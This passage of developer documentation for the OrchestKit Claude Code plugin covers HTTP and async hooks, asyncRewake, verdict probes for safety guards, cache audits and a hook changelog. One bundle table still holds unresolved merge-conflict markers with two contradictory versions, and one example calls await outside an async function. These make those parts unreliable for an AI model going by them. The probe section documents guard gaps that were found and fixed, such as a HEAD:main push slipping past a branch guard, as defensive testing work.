URL field:     "https://real-domain.com/path"  ✅ Works (valid URL at parse time)
Header field:  "Bearer $ORCHESTKIT_HOOK_TOKEN" ✅ Works (headers not URL-validated)
```

This means HTTP hooks cannot use env var placeholders in URLs at the plugin level. They must contain real URLs — which vary per user.

### Solution: User-Level Generation

HTTP hooks live in `.claude/settings.local.json` (per-user, not committed), generated with real URLs via CLI:

```bash
npm run generate:http-hooks -- https://your-api.com/hooks --write
```

### Required Env Var Checklist (#1860)

Every generated entry references `$ORCHESTKIT_HOOK_TOKEN` literally as the Bearer token. If the var is unset in the shell that launches Claude Code, **every hook fire returns 401** and CC surfaces on-screen `PreToolUse:Bash hook error` spam — which masks real errors (e.g. yonatan-hq/platform#3589 ingestion gaps).

The generator now fails closed: `--write` refuses to persist entries when `$ORCHESTKIT_HOOK_TOKEN` is empty.

```text
1. Pick a token:           your CC plugin server expects a bearer string.
2. Export it in the shell: export ORCHESTKIT_HOOK_TOKEN=<token>
3. Persist it:             echo 'export ORCHESTKIT_HOOK_TOKEN=...' >> ~/.zshrc
   - OR 1Password ref:     op read 'op://<vault>/orchestkit/hook-token'
4. Run the generator:      npm run generate:http-hooks -- <url> --write
5. Restart the CC session  so the new settings.local.json takes effect.
```

If you intend to set the token later (in a different shell init, secret manager fetch, etc.), pass `--allow-missing-token` to bypass the guard — but the SessionStart hook (`lifecycle/hook-token-check`) will still emit a stderr warning every time CC starts until the var is exported.

See `src/skills/configure/references/http-hooks.md` for full setup guide.

### Do NOT Re-Add HTTP Hooks to Plugin hooks.json

Any `type: "http"` entry in plugin-level `hooks.json` must use a hardcoded URL. Env var placeholders in the `url` field will break the entire plugin. Use the generator CLI for user-specific endpoints.

---

## Async Hooks (CC 2.1.19+)

### Overview

Async hooks execute in the background without blocking the main conversation flow. This is ideal for:
- **Analytics and metrics** - Track usage patterns without slowing responses
- **Network I/O** - External API calls (webhooks, sync operations)
- **Session startup** - Heavy initialization that doesn't need to complete before user interaction

### Configuration

Add `async: true` and `timeout` to hook definitions in `hooks.json`:

```json
{
  "type": "command",
  "command": "node ${CLAUDE_PLUGIN_ROOT}/hooks/bin/run-hook.mjs posttool/session-metrics",
  "async": true,
  "timeout": 30
}
```

### asyncRewake: a background verdict that interrupts (2026-08-29)

An async hook cannot block: CC ignores `decision`, `permissionDecision` and `continue` from it because the action already ran, and it delivers the hook's `additionalContext` / `systemMessage` on the NEXT turn, which in a `-p` session may never come. Three ork async hooks nevertheless compute a real block verdict (`posttool/write/stale-import-detector`, `skill/coverage-threshold-gate`, `skill/cross-instance-test-validator`); that verdict was the #3779 class, established after the moment it could act.

CC's `asyncRewake: true` (command hooks) changes one thing: a hook that exits 2 wakes Claude immediately, idle or not, with its stderr (stdout if stderr is empty) as a system reminder. Measured with a nonce-bearing PostToolUse hook against a scripted loopback Messages API, zero spend: on 2.1.251 and on 2.1.248 the nonce appeared in the very next request as `<system-reminder> Stop hook blocking error from command "PostToolUse:Read": <nonce> ...`; the same hook with plain `async: true` never reached the model inside the session. `claude plugin validate` accepts the field on 2.1.248, 2.1.250 and 2.1.251, but it also accepts a made-up field name on all three, so validate proves nothing about support; only the run does.

Wiring: those three entries carry `"asyncRewake": true` and pass `--rewake` to `bin/run-hook.mjs`. Under that flag the runner, after printing the usual JSON, repeats `stopReason` on stderr as `[<hook>] <reason>` and exits 2 when the hook returned `continue: false`; every other outcome exits 0 as before, and without the flag nothing changes (`src/__tests__/bin/run-hook-rewake.test.ts`, three cases). `timeout` is enforced again on rewake hooks (CC does not enforce it on plain async ones), so their existing timeouts are live budgets now.

### run_on_fail (OrchestKit-internal only)

The `run_on_fail` field is **NOT part of the CC hooks spec**. CC ignores unknown JSON fields. Our dispatchers implement their own `runOnFail` logic in TypeScript (see `sync-session-end-dispatcher.ts`) to ensure critical hooks like session-cleanup always execute even if prior hooks fail. This is enforced at the dispatcher level, not by CC.

### Async vs Synchronous Hooks

| Aspect | Synchronous | Async |
|--------|-------------|-------|
| Blocking | Yes - waits for completion | No - runs in background |
| Result handling | Immediate response processing | Notified on completion |
| Use case | Validation, blocking, context injection | Analytics, logging, external calls |
| Timeout | Default 2 minutes | Explicit timeout required |

### When to Use Async Hooks

**Use async for:**
- Session metrics and audit logging
- Pattern extraction and learning
- External API calls (GitHub, webhooks)
- Non-critical sync operations
- Any hook that doesn't need to block execution

**Keep synchronous for:**
- Security validation (must block dangerous commands)
- Permission decisions (must respond before execution)
- Context injection (must add context before tool runs)
- Quality gates (must validate before allowing writes)

### Current Async Hooks

**SessionStart (4 hooks)** - Startup optimization:
- `pattern-sync-pull` - Pull learned patterns
- `session-env-setup` - Environment setup
- `stale-team-cleanup` - Clean up stale team members
- `type-error-indexer` - Index type errors

> **CC 2.1.47 Deferral**: SessionStart hooks fire ~500ms after session init. Async hooks are unaffected (fire-and-forget). Sync hooks still run before the first user prompt. Do not assume env vars set by async SessionStart hooks are available at first `UserPromptSubmit`.

**PostToolUse (3 hooks)** - Security + local state:
- `redact-secrets` - Scrub API keys from tool output
- `config-change-auditor` - Config drift detection
- `team-member-start` - Track active team members

**Stop (7 hooks)** - Session-end gates:
- `handoff-writer` - Write handoff for next session
- `task-completion-check` - Verify task status
- `security-scan-aggregator` - Aggregate security findings
- `coverage-check` - Check test coverage
- `evidence-collector` - Collect session evidence
- `coverage-threshold-gate` - Enforce coverage thresholds; on block, names the lowest-covered files (and uncovered line ranges where the report provides them) so the block doubles as input to a repair pass
- `cross-instance-test-validator` - Cross-instance validation

### Timeout Recommendations

| Hook Category | Recommended Timeout | Rationale |
|---------------|---------------------|-----------|
| Local analytics | 10-30s | Fast local operations |
| Memory sync | 30s | Cloud API calls |
| GitHub operations | 30-60s | Rate limit handling |
| Heavy processing | 60s | Complex extraction |

### Error Handling

Async hooks should handle errors gracefully:

```typescript
export function myAsyncHook(input: HookInput): HookResult {
  try {
    // External API call or heavy processing
    await syncToCloud(data);
    return outputSilentSuccess();
  } catch (err) {
    // Log error but don't fail - async hooks shouldn't block
    logHook('my-async-hook', `Error (non-blocking): ${err.message}`);
    return outputSilentSuccess();
  }
}
```

### Migration from background: true

The `background: true` flag (CC 2.1.19) was replaced by `async: true` for clarity:

```json
// Old (deprecated)
{
  "type": "command",
  "command": "...",
  "background": true
}

// New (CC 2.1.19+)
{
  "type": "command",
  "command": "...",
  "async": true,
  "timeout": 30
}
```

---

## CC 2.1.9 Compliance

### additionalContext Feature

Hooks can inject additional context BEFORE tool execution:

```typescript
import { outputAllowWithContext } from './lib/common.js';

export function myPreToolHook(input: HookInput): HookResult {
  const context = `
⚠️ IMPORTANT: You are about to modify a critical file.
- Ensure changes are backwards compatible
- Update tests if behavior changes
- Document breaking changes in CHANGELOG
`;

  return outputAllowWithContext(context);
}
```

**Use Cases:**
- Warn about risky operations
- Inject best practices before execution
- Provide contextual guidance based on detected patterns

### Session ID Guaranteed

CC 2.1.9 guarantees `session_id` field is always present:

```typescript
export function myHook(input: HookInput): HookResult {
  // No fallback needed - session_id guaranteed
  const sessionId = input.session_id;
  logHook('my-hook', `Session: ${sessionId}`);
}
```

---

## CC 2.1.16 Compliance (Task Management)

Hooks can interact with CC 2.1.16 Task Management System for dependency tracking:

```typescript
// Example: Create task dependency when detecting blocking issue
export function myHook(input: HookInput): HookResult {
  const context = `
⚠️ Migration required before proceeding

Consider creating a task:
- Subject: "Run database migration"
- Add blockedBy dependency to current task
`;

  return outputWithContext(context);
}
```

**Task Status Workflow:**
- `pending` → `in_progress` → `completed`

**Dependency Tracking:**
- Use `blockedBy` for prerequisites
- Use `blocks` for dependent tasks

See `skills/task-dependency-patterns` for comprehensive patterns.

---

## Logging

### Hook Logging

```typescript
import { logHook } from './lib/common.js';

// Log general hook activity
logHook('my-hook', 'Processing bash command');
logHook('my-hook', `File: ${filePath}`);
```

**Output:** `~/.claude/logs/ork/hooks.log` (if installed via plugin) or `.claude/logs/hooks.log`

**Format:** `[2026-01-23 10:15:30] [my-hook] Processing bash command`

**Rotation:** Automatic at 200KB

### Permission Feedback Logging

```typescript
import { logPermissionFeedback } from './lib/common.js';

// Log permission decisions for audit trail
logPermissionFeedback('allow', 'Auto-approved readonly operation', input);
logPermissionFeedback('deny', 'Blocked dangerous command', input);
logPermissionFeedback('warn', 'Potential security risk detected', input);
```

**Output:** `~/.claude/logs/ork/permission-feedback.log`

**Format:** `2026-01-23T10:15:30.123Z | allow | Auto-approved readonly operation | tool=Read | session=abc123`

**Rotation:** Automatic at 100KB

---

## Type Guards

Use type guards to narrow tool input types:

```typescript
import { isBashInput, isWriteInput, isEditInput } from '../types.js';
import type { BashToolInput, WriteToolInput } from '../types.js';

export function myHook(input: HookInput): HookResult {
  if (isBashInput(input.tool_input)) {
    // TypeScript knows tool_input has 'command' field
    const command: string = input.tool_input.command;
  }

  if (isWriteInput(input.tool_input)) {
    // TypeScript knows tool_input has 'file_path' and 'content'
    const filePath: string = input.tool_input.file_path;
    const content: string = input.tool_input.content;
  }
}
```

**Available Type Guards:**
- `isBashInput(input)` - Bash tool (command field)
- `isWriteInput(input)` - Write tool (file_path, content)
- `isEditInput(input)` - Edit tool (file_path, old_string, new_string)
- `isReadInput(input)` - Read tool (file_path)

---

## Best Practices

### 1. Use Guards Early

```typescript
// ✅ Good: Guard at top, fast return
export function myHook(input: HookInput): HookResult {
  const guardResult = guardBash(input);
  if (guardResult) return guardResult;

  // Hook logic...
}

// ❌ Bad: Complex logic before guard check
export function myHook(input: HookInput): HookResult {
  const command = input.tool_input.command || '';
  const normalized = normalizeCommand(command);
  // ... 50 lines of logic ...

  if (input.tool_name !== 'Bash') return outputSilentSuccess(); // Too late!
}
```

### 2. Silent by Default

```typescript
// ✅ Good: Silent success for non-issues
if (noIssuesFound) {
  return outputSilentSuccess();
}

// ❌ Bad: Noisy logging for normal operations
return {
  continue: true,
  systemMessage: "✓ Hook completed successfully" // Don't spam user
};
```

### 3. Block with Clear Reasons

```typescript
// ✅ Good: Explain WHY and HOW to fix
return outputBlock(`
❌ Direct commits to 'main' branch are not allowed.

Fix: Create a feature branch
  git checkout -b feature/my-feature
  git commit -m "Your changes"
  gh pr create
`);

// ❌ Bad: Vague error
return outputBlock('Operation not allowed');
```

### 4. Use Type Guards

```typescript
// ✅ Good: Type-safe access
if (isBashInput(input.tool_input)) {
  const command = input.tool_input.command; // TypeScript knows this exists
}

// ❌ Bad: Unsafe access
const command = input.tool_input.command || ''; // Might be undefined
```

### 5. Log Sparingly

```typescript
// ✅ Good: Log meaningful events
logHook('my-hook', `Blocked dangerous command: ${command}`);

// ❌ Bad: Log noise
logHook('my-hook', 'Hook started');
logHook('my-hook', 'Checking command...');
logHook('my-hook', 'Command is safe');
logHook('my-hook', 'Hook finished');
```

### 6. Handle Errors Gracefully

```typescript
// ✅ Good: Catch errors, return silent success
export function myHook(input: HookInput): HookResult {
  try {
    // Hook logic...
    return outputSilentSuccess();
  } catch (err) {
    logHook('my-hook', `Error: ${err.message}`);
    return outputSilentSuccess(); // Don't block on hook errors
  }
}

// ❌ Bad: Let errors crash the hook
export function myHook(input: HookInput): HookResult {
  const data = fs.readFileSync('/nonexistent'); // May throw!
  // Hook logic...
}
```

---

## Performance Considerations

### Bundle Architecture (Phase 4 Split Bundles)

**Per-Event Loading:** Each hook event loads only its specific bundle:

| Bundle | Size | Exports | When Loaded |
|--------|------|---------|-------------|
| permission.mjs | 8KB | 41 | PermissionRequest events |
| pretool.mjs | 48KB | 50 | PreToolUse events |
| posttool.mjs | 58KB | 35 | PostToolUse events |
| prompt.mjs | 57KB | 89 | UserPromptSubmit events |
| lifecycle.mjs | 31KB | 35 | SessionStart/SessionEnd |
| stop.mjs | 33KB | 35 | Stop events |
| subagent.mjs | 56KB | 66 | SubagentStart/Stop |
| notification.mjs | 5KB | 26 | Notification events |
| setup.mjs | 24KB | 26 | Setup/maintenance |
| skill.mjs | 52KB | 35 | Skill operations |
| agent.mjs | 8KB | 41 | Agent operations |

**Performance Gains:**
- **89% per-load savings:** Average ~35KB loaded per hook vs 324KB unified
- **Split total:** 648KB (across 11 bundles)
- **Typical load:** 8-58KB depending on event type

### Hook Execution Time

- **Permission hooks:** < 10ms (block if slower)
- **PreTool hooks:** < 50ms (critical path)
- **PostTool hooks:** < 100ms (non-blocking)

### Optimization Tips

1. **Early returns:** Use guards at top of function
2. **Lazy loading:** Import heavy dependencies only when needed
3. **Avoid I/O:** Minimize file system operations
4. **Cache results:** Store expensive computations
5. **Skip trivial:** Use guards to skip echo, ls, pwd, etc.
6. **Bundle-aware:** Place hooks in correct entry point for optimal loading

### 7. Preserve Prompt Cache

Claude Code uses prefix-based prompt caching. Hooks interact with caching in two ways:

**Safe (preserves cache):**
- Injecting `additionalContext` via `outputPromptContext()` or `outputAllowWithContext()` — these add to the current user message, not the system prompt prefix
- Using `<system-reminder>` tags in tool results — appended to messages, not the prefix
- `async: true` hooks — run in background, don't affect the conversation prefix

**Dangerous (breaks cache):**
- Anything that would modify the system prompt, tool definitions, or tool ordering
- Adding/removing MCP servers mid-session (changes the tool set in the prefix)
- Hooks that suggest switching models mid-conversation (each model has its own cache)

```typescript
// CORRECT: Inject via additionalContext (appended to message, cache-safe)
return outputPromptContext('Updated context: project uses React 19');

// WRONG: Using systemMessage for dynamic updates (visible to user, not cache-related
// but wasteful — additionalContext is the right channel for hook-injected guidance)
return { continue: true, systemMessage: 'Updated context: project uses React 19' };
```

**Why this matters:** The Claude Code team monitors cache hit rate like uptime. A few percentage points of cache miss can dramatically affect cost and latency for users.

### Cache Audit: Context Injection Classification (#1234)

All hooks that inject `additionalContext` are classified by volatility. Volatile injections (per-turn) break the API prompt cache prefix. Cacheable injections run once and don't affect per-turn cache.

| Hook | Event | Frequency | Volatile? | Status |
|------|-------|-----------|-----------|--------|
| **SessionStart hooks** | | | | |
| sync-session-dispatcher | SessionStart | once | No | Materializes rules files |
| session-handoff-injector | SessionStart | once | No | Injects prior handoff |
| unified-dispatcher (async) | SessionStart | once | No | Fire-and-forget setup |
| **UserPromptSubmit hooks** | | | | |
| handoff-injector | UserPromptSubmit | once (flag) | No | File-flag gated |
| context-exhaustion-warner | ~~UserPromptSubmit~~ | ~~per-turn~~ | Deleted | #3427 — bridge file had zero writers |
| pipeline-detector | ~~UserPromptSubmit~~ | ~~per-turn~~ | Deleted | #3352 — starved by the Teams-yield gate, 0 detections since 2026-01-23 |
| frustration-detector | UserPromptSubmit | per-turn | No output | Analytics only |
| cache-break-detector | UserPromptSubmit | per-turn | No output | Analytics only |
| **Skill context loaders** | | | | |
| 10 once:true loaders | PreToolUse | once/skill | No | File-flag gated |
| **Already migrated to SessionStart** | | | | |
| profile-injector | ~~UserPromptSubmit~~ | once | Moved | #960 |
| memory-context-loader | ~~UserPromptSubmit~~ | once | Moved | #448 |
| antipattern-warning | ~~UserPromptSubmit~~ | ~~per-turn~~ | Deleted | #972, #1145 |

**Result:** 0 hooks now inject volatile per-turn context. The audit originally counted 2 — `context-exhaustion-warner` and `pipeline-detector`. `context-exhaustion-warner` was never volatile in practice — its StatusLine bridge file lost its writer in `2de086fa9` (#1194) and it silently no-op'd on every turn from 2026-03-29 until #3427 deleted it (#3321 claim 4). `pipeline-detector` was genuinely volatile but its detection was starved by the Teams-yield gate on every call (0 detections since 2026-01-23); deleted in #3352. No further migration candidates identified.

**Measured by:** `cache-break-detector` tracks shape changes and logs to `~/.claude/analytics/cache-breaks.jsonl`. `sync-session-dispatcher` logs `session-start-perf.jsonl` with duration.

---

## Verdict probes: proving a hook does its job, not just that it runs

`ok: true` in `~/.claude/analytics/hook-timing.jsonl` means the runner did not throw. It said nothing about what the hook decided, and #3801 showed the cost: `stale-import-detector` sat at `ok:true, 2 ms` for months while its grep was rejected before it ran. Two instruments close that gap (2026-08-29).

**1. `verdict` in hook-timing.** `bin/run-hook.mjs` classifies every result (`deny` / `ask` / `allow` / `defer` from `permissionDecision`, `block` from `continue:false` or `decision:block`, `context` when only `additionalContext` / `updatedInput` / `systemMessage` came back, `silent` otherwise, `error` on throw, and `bundle-error` when the dist bundle exists but cannot be imported, #3817) and writes it on the timing line. A decisive hook whose verdicts are all `silent` over a window is either healthy and unprovoked, or dead; the probes decide which.

Two bundle-load outcomes, and only one is silent (#3817). A bundle FILE that is absent (not built yet, or a stale plugin cache with no dist anywhere) returns the silent-success envelope with exit 0, as before. A bundle that exists but cannot be imported writes one stderr line naming the file and the error, a hook-timing row with `verdict: bundle-error` and `ok: false`, and exits 2 for security hooks and `--rewake` entries (CC: blocking error, stderr shown to Claude, so a guard that cannot run fails closed) or 1 for every other hook (non-blocking, shown to the user). Nothing goes to stdout on that path. The import itself goes through `pathToFileURL`, because a bare absolute path is accepted by `import()` on posix and rejected on win32, where Node reads `C:` as a URL scheme; with the bare path every hook no-oped on Windows through the dispatcher for as long as the bug existed, and `windows-smoke.yml` was green the whole time because it asserted only the exit code. That job now also drives the `bash-catastrophic-rm-deny` probe through the src-built runner and asserts the verdict.

**2. `tests/hooks/verdict-probes/`.** `probes.json` lists one probe per decisive hook: the hooks.json entry production reaches (the dispatcher, where the guard lives inside one), a `trip` fixture that must produce the verdict, and a `control` fixture that must not, so a probe that cannot fail is itself caught. `run-probes.mjs` spawns the real built runner with the real payload shape; `test-hook-verdict-probes.sh` runs in the `tests/hooks` roster on every PR. `xfail: "#issue: reason"` marks a hook known not to fire; it is counted, and the day it fires the suite reports XPASS and fails until the marker is removed.

First run, 17 probes: 13 passed, 1 known-dead, 3 red. The three reds were two real defects and one harness bug, which is the shape this suite is for:

| finding | what the probe saw | fix |
|---|---|---|
| `sync-write-edit-dispatcher` dropped sibling `ask` verdicts (only `additionalContext` and `updatedInput` were merged), so `file-guard` and `context-file-budget-guard` had been inert since they moved from deny to ask | direct: `ask`; through the dispatcher: `updatedInput` only | the merge now carries the most severe `permissionDecision` (deny over ask) alongside context and updatedInput |
| `git-validator` allowed `git push origin HEAD:main` from a feature branch: the early return judged only the session branch, while its own comment on `extractPushDestinations` says `HEAD:main -> ['main'] (still protected)` | `silent` with and without a git repo in cwd | an explicitly named protected destination denies from any branch; the #3455 allow (every destination non-protected) is unchanged |
| `cross-instance-test-validator` is registered on `Stop` but reads `tool_input.file_path`, which a Stop payload never carries (#3804) | `silent` on a fixture with two untested exports | tracked as `xfail` until its event or its input is fixed |

Adding a probe: copy an entry, point `hook` at the hooks.json entry (not the sub-guard), write a trip that satisfies every condition in the handler's own code, and a control one condition short. If the trip stays silent, run the sub-guard directly through `run-hook.mjs` with the same payload before blaming the wiring; a `{repeat, times}` value expands to bulk content in files and payload fields alike.

## Troubleshooting

### Debug Environment Variables (CC 2.1.111+)

| Env Var | Purpose | Caveats |
|---|---|---|
| `OTEL_LOG_RAW_API_BODIES=1` | Log raw Anthropic API request/response bodies to the OpenTelemetry log stream. Essential for diagnosing tool-result parsing issues and prompt caching behavior. | **Risk: leaks secrets** — API bodies contain full prompt text, tool inputs, and tool outputs. Never enable in shared logging infrastructure. Local debugging only, and scrub before sharing. |
| `CLAUDE_CODE_USE_POWERSHELL_TOOL=1` | (Windows) Opts into the native PowerShell tool for Bash-equivalent commands. Progressively rolling out in CC 2.1.111. | Windows only. Shell semantics differ — hooks that parse command strings may need the `isWindows()` guard. |
| `CLAUDE_MAX_CONTEXT=<tokens>` | Overrides the context window used by `lib/context-window.ts` for budget scaling. Default `1000000`. Lower values scale per-category budgets down proportionally (see `lib/hook-priorities.ts`). | Does not change CC's actual context window — only governs OrchestKit's budget math. Set for local testing of 200K-window behavior without switching models. |
| `ENABLE_PROMPT_CACHING_1H=1` | CC 2.1.108+: 1-hour prompt cache TTL (vs 5 min). Meaningful cost savings for long OrchestKit sessions. | API key, Bedrock, Vertex, Foundry only. |
| `ORK_SKIP_PLUGIN_ERROR_CHECK=1` | Skip eval preflight that exits on `plugin_errors` from stream-json init (see `tests/evals/scripts/lib/eval-common.sh`). | For meta-testing the eval runners themselves; never set in production eval runs. |

### Hook Not Running

**Check:**
1. Hook registered in `src/index.ts`?
2. Hook added to `.claude/settings.json`?
3. Bundle built? (`npm run build`)
4. Matcher pattern correct?

**Debug:**
```bash
# Test hook directly
echo '{"tool_name":"Bash","session_id":"test","tool_input":{"command":"git status"}}' | \
  node bin/run-hook.mjs pretool/bash/my-hook
```

### Hook Blocking Incorrectly

**Check:**
1. Guard logic correct?
2. Using correct output builder?
3. Return early for non-matching cases?

**Debug:**
```typescript
// Add logging
logHook('my-hook', `Tool: ${input.tool_name}, Command: ${input.tool_input.command}`);
```

### Bundle Size Exceeds 100KB

**Actions:**
1. Check `dist/bundle-stats.json` for breakdown
2. Identify large dependencies
3. Consider lazy loading or removal
4. Run `npm run build` and check warnings

### TypeScript Errors

**Check:**
```bash
npm run typecheck
```

**Common Issues:**
- Missing type imports
- Incorrect type annotations
- Outdated types.ts definitions

---

## Adding Hooks to Split Bundles

When adding new hooks, place them in the appropriate entry point for optimal bundle loading:

### Step 1: Identify Event Type

| Event | Entry Point | Bundle |
|-------|-------------|--------|
| PermissionRequest | src/entries/permission.ts | permission.mjs |
| PermissionDenied | src/entries/permission.ts | permission.mjs |
| PreToolUse | src/entries/pretool.ts | pretool.mjs |
| PostToolUse | src/entries/posttool.ts | posttool.mjs |
| PostToolUseFailure | src/entries/posttool.ts | posttool.mjs |
| UserPromptSubmit | src/entries/prompt.ts | prompt.mjs |
| SessionStart/End | src/entries/lifecycle.ts | lifecycle.mjs |
| Stop/StopFailure | src/entries/stop.ts | stop.mjs |
| SubagentStart/Stop | src/entries/subagent.ts | subagent.mjs |
| Notification | src/entries/notification.ts | notification.mjs |
| Setup | src/entries/setup.ts | setup.mjs |
| PreCompact/PostCompact | src/entries/lifecycle.ts | lifecycle.mjs |
| Elicitation/ElicitationResult | (root hooks.json) | lifecycle.mjs |
| InstructionsLoaded | (root hooks.json) | lifecycle.mjs |
| ConfigChange | (root hooks.json) | lifecycle.mjs |
| TaskCreated/TaskCompleted | (root hooks.json) | lifecycle.mjs |
| TeammateIdle | (root hooks.json) | lifecycle.mjs |
<<<<<<< HEAD
| WorktreeRemove | (root hooks.json) | lifecycle.mjs (webhook-forwarder only; WorktreeCreate is deliberately unregistered, #3315) |
| CwdChanged | src/entries/lifecycle.ts | lifecycle.mjs (`lifecycle/cwd-changed`) |
| FileChanged | src/entries/lifecycle.ts | lifecycle.mjs (`lifecycle/file-changed`) |
=======
| WorktreeCreate/Remove | (root hooks.json) | lifecycle.mjs |
| PreModelSwitch/PostModelSwitch | (root hooks.json) | lifecycle.mjs (`lifecycle/model-switch-consent`, `lifecycle/model-switch-telemetry`) |
| CwdChanged | *not hooked* | — |
| FileChanged | *not hooked* | — |
>>>>>>> 4a129148b (feat(hooks): PreModelSwitch consent gate + PostModelSwitch telemetry)
| Skill-specific | src/entries/skill.ts | skill.mjs |
| Agent-specific | src/entries/agent.ts | agent.mjs |

**Hooked since the 2.1.83 events landed (this table previously said "not hooked" for both; corrected 2026-08-29):**
- `CwdChanged` — `lifecycle/cwd-changed` (two hooks.json entries: the handler plus the webhook forwarder). Reacts to `/cd` and worktree switches; CC 2.1.246 also reloads project hooks, skills and agents on `/cd`, so this is where a cwd-scoped context refresh belongs.
- `FileChanged` — `lifecycle/file-changed` (two entries, as above). Observes external file modifications; PostToolUse still covers writes made by tools.

### Step 2: Register in Entry Point

```typescript
// In src/entries/pretool.ts (example)
import { myNewHook } from '../pretool/bash/my-new-hook.js';

export const hooks: Record<string, HookFn> = {
  // ... existing hooks ...
  'pretool/bash/my-new-hook': myNewHook,
};
```

### Step 3: Export from Main Index

Also add to `src/index.ts` for CLI tools that use the unified bundle:

```typescript
export { myNewHook } from './pretool/bash/my-new-hook.js';
```

### Step 4: Update run-hook.mjs (if new category)

If adding a new hook category, update `bin/run-hook.mjs` bundleMap:

```javascript
const bundleMap = {
  // ... existing mappings ...
  'my-category': 'my-bundle',
};
```

---

## References

- **Claude Code Plugin Docs:** https://docs.anthropic.com/claude-code/plugins
- **CC 2.1.69 Spec:** Hook input/output field expansion (tool_use_id, agent_transcript_path, permission_suggestions, is_interrupt, updatedMCPToolOutput, updatedPermissions, permissionDecision 'ask')
- **CC 2.1.16 Spec:** Task Management System with dependency tracking
- **CC 2.1.9 Spec:** additionalContext support
- **CC 2.1.7 Spec:** Hook output format
- **Project README:** `README.md`
- **CLAUDE.md:** `CLAUDE.md`

## Managed vs User Settings (CC 2.1.49)

Plugin `settings.json` provides **managed defaults** for hooks. Three tiers of precedence:

1. **Managed** (plugin `settings.json`) — shipped by OrchestKit, user can override
2. **Project** (`.claude/settings.json`) — repository-level config
3. **User** (`~/.claude/settings.json`) — personal preferences, highest priority

OrchestKit hooks are managed defaults. Users retain full control to disable any hook.

---

**Last Updated:** 2026-02-28
**Version:** 2.1.0 (Async hooks support)
**Architecture:** 11 split bundles (648KB total)
**Hooks:** <!--ork:hooks-->176<!--/ork--> hooks (<!--ork:hooks-global-->155<!--/ork--> global + <!--ork:hooks-agent-->0<!--/ork--> agent-scoped + <!--ork:hooks-skill-->21<!--/ork--> skill-scoped)
**Average Bundle:** ~35KB per event
**Claude Code Requirement:** >= 2.1.78

See the async hooks section above for detailed async hook patterns.

## Registry changelog (archived from hooks.json description, 2026-07-18)

The registry's change history used to accumulate inside the `description` field of `hooks.json`, which made the count unreadable and the JSON diff-hostile. The field now carries only the stamped count line; history continues here.

(count 175 -> 176, 2026-08-31, #3727): `lifecycle/stray-playground-pages` added (SessionStart, async, 5 s). Three rules together made untracked explainer pages invisible: the glyph skill writes `docs/playgrounds/<category>/<slug>.html` and never stages it; `.gitignore` ignores `playgrounds/` globally and un-ignores `docs/playgrounds/`, so the pages are untracked AND un-ignored; and the CI playground gate treats both `docs/playgrounds/` and `docs/<type>--<slug>/` as INERT, so no gate ever sees them. Five such pages were found by hand on 2026-08-30 (#3706 recurred as #3727). The hook runs `git --no-optional-locks status --porcelain=v1 --untracked-files=all -z -- docs/playgrounds 'docs/*--*'` (3 s bound; silent on any git failure, no repo, or timeout), keeps `??` entries under the two roots, drops anything younger than the threshold (1 h, `ORK_STRAY_PLAYGROUND_MIN_AGE_HOURS`), and reports up to ten paths with their age as SessionStart `additionalContext`, advisory only, with the two resolutions (commit on a branch plus a Lab manifest entry, or delete). Once per session: `.claude/state/stray-playgrounds-<sid>.json`, read back after writing, siblings older than 7 days unlinked; opt-out `ORK_NO_STRAY_PLAYGROUND_CHECK=1`. SessionStart rather than Stop because at Stop the page the session just wrote is minutes old, so any threshold is zero or meaningless; the forgotten page is the one the NEXT session finds an hour later. `bin/stop-uncommitted-check.mjs`, which already counts untracked files anonymously, was left alone: it is a release-please governed file. Tests run on a real temp git repo with backdated mtimes (`__tests__/lifecycle/stray-playground-pages.test.ts`, 11 cases); the first case fails on main, where the hook does not exist. The verdict-probe harness cannot git-init or backdate, so the real-runner check is the vitest file rather than a probes.json entry.

(count unchanged at 176, 2026-08-31, #3733): `prompt/multi-step-task-nudge` gives up after N unanswered prompts. Its permanent silencer keys on a TaskCreated event in `.claude/logs/task-creations.jsonl`, which cannot occur in a session whose tool set has no TaskCreate (dispatch-style sessions), so the nudge re-fired every 6th qualifying prompt for the whole session and told the model to call a tool it did not have (observed 2026-08-25). `HookInput` carries no tool list, so the fix is a cap keyed to this session's own non-usage: after `ORK_TASK_NUDGE_MAX_UNANSWERED` qualifying prompts (default 3, clamped 2..1000, read once at module load) with zero TaskCreated events, one final line fires, conditionally worded ("if TaskCreate is available ... if it is not in this session's tool set, disregard; this nudge stays silent for the rest of the session"), and the nudge is silent thereafter. The full nudge no longer asserts the tool exists either. Explicit asks ("todo list", "organise the session") still fire past the cap, conditionally worded. State stays in the existing per-session counter file, so `qualifyingPromptCount` (the Stop-side telemetry denominator) keeps advancing while capped, and a TaskCreated before the cap restores the normal silencing with no new code. The fix lives on the branch a task-less session actually reaches and is verified by postcondition on such a session: the throttle test that expected the 7th prompt to re-fire now expects `[T,F,T,F,F,F,F]` and fails on main.

(count unchanged at 175, 2026-08-30, #3817): `bin/run-hook.mjs` imported its dist bundle by bare absolute path (`import(join(dist, name + '.mjs'))`), which win32 rejects with `ERR_UNSUPPORTED_ESM_URL_SCHEME` because Node reads `C:` as a URL scheme, and the surrounding catch called `silentExit()`: `{"continue":true,"suppressOutput":true}`, exit 0, no stderr, and no hook-timing row, since `trackHookTriggered` is only reached from `runHook()` and stdin was never read. So through the dispatcher every hook no-oped on Windows, including the security guards, while `windows-smoke.yml` stayed green because its one functional step piped a benign command in and asserted `$LASTEXITCODE -eq 0`, which a dead dispatcher satisfies exactly as well as a live one. Found by the contributor of #3815 while running that PR's integration test on Windows. Fix, three parts: the import goes through `pathToFileURL(bundlePath).href` (the dead, never-called `loadBundle()` that carried the same defect is deleted); the catch now distinguishes the two load outcomes, absent file (still silent, the legitimate not-built case) from present-but-unloadable, and the second writes one stderr line naming the file and the error, a synchronous hook-timing row with its own verdict `bundle-error` (a caught load error must never render as the same field value a pass uses; the row builder is now one shared `timingRow()` so the two writers cannot drift), and exits 2 for `SECURITY_HOOKS` and `--rewake` entries or 1 otherwise, nothing on stdout; and the Windows job gained a step that runs the `bash-catastrophic-rm-deny` verdict probe through the src-built runner (`PLUGIN_ROOT=src`) and asserts `deny`, so the dispatcher's liveness on Windows is now measured rather than inferred from an exit code. `tests/hooks/verdict-probes/run-probes.mjs` mirrors the new verdict (a non-zero exit with no envelope and the stderr signature classifies as `bundle-error`, not the ambiguous `silent`). Unit suite `__tests__/bin/run-hook-bundle-error.test.ts` copies the runner into a private tree with a dist file that is a SyntaxError on import (win32 is not available locally; a synthetic unloadable bundle throws on every platform) and pins exit 2 + stderr + row for a security hook, exit 1 for a plain hook, exit 2 with `--rewake`, and the absent-bundle case staying silent with exit 0 and no row; the first three 